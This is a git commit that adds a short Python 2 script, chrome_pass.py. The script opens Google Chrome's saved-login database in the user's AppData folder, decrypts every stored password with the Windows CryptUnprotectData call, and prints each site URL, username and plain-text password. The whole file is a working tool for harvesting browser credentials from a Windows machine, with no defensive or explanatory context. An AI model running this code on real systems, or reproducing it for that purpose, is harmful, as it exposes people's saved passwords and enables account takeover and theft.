d7849ccdebaf02863c13414b1282cbfd5906c665
David White <david@digitalkiwi.co.nz>
2016-01-05 21:37:48 +1300

    new file:   chrome_pass.py

---
+++ chrome_pass.py
@@ -0,0 +1,21 @@
+from os import getenv
+import sqlite3
+import win32crypt
+
+# Connect to the Database
+# Check if file exists in default location
+try:
+    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
+except Exception as e:
+    print e
+
+cursor = conn.cursor()
+# Get the results
+cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+for result in cursor.fetchall():
+  # Decrypt the Password
+	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+	if password:
+		print 'Site: ' + result[0]
+		print 'Username: ' + result[1]
+		print 'Password: ' + password + '\n'
